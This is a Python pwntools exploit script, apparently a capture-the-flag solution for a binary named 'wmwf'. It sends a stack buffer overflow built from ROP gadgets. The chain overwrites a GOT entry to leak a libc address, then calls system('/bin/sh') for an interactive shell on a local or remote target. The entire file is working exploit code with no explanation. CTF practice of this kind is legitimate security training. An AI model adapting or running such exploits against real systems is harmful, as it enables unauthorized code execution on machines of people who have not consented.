from pwn import *
from pwnlib.util import misc
from subprocess import Popen, run
from time import sleep

context.terminal = ["kitty"]

file = ELF("./wmwf")
libc = ELF("./lib/libc.so.6")

env = {}
if args.GDB:
    env["QEMU_GDB"] = "1234"
if args.HOST and args.PORT:
    p = remote(args.HOST, args.PORT)
else:
    p = process("./wmwf", env=env)

pop_r3 = p32(0x00010390)
pop_r4 = p32(0x000104ae + 1)
write_r3_to_r4 = p32(0x000104ac + 1)
r3 = lambda val: pop_r3 + p32(val)
r4 = lambda val: pop_r4 + p32(val)
wb = write_r3_to_r4 + p32(0)
call = lambda arg: r3(arg) + p32(0x000104d2 + 1)
ret = 0x00010494 + 1

def write(target: int, number: int):
    payload = b""
    for i, byte in enumerate(p32(number)):
        payload += r3(byte)
        payload += r4(target + i)
        payload += wb
    return payload

p.recvuntil(b"?\n")

payload = b"A" * 0x104
payload += write(file.got.setbuf, file.plt.puts)
payload += call(file.sym.stdout)
p.sendline(payload)

leak = u32(p.recv(8)[4:])
libcbase = leak - 0x11ed97

log.info(f"leak @ {leak:#x}")
log.info(f"libcbase @ {libcbase:#x}")

system = p32(libcbase + 0x00035431)
r0 = lambda val: p32(libcbase + 0x000844e8) + p32(val) + p32(0)

log.info(f"leak @ {leak:#x}")

payload = b"A" * 0x104
payload += r0(libcbase + next(libc.search(b"/bin/sh\x00")))
payload += system
p.sendlineafter(b"?", payload)

p.interactive()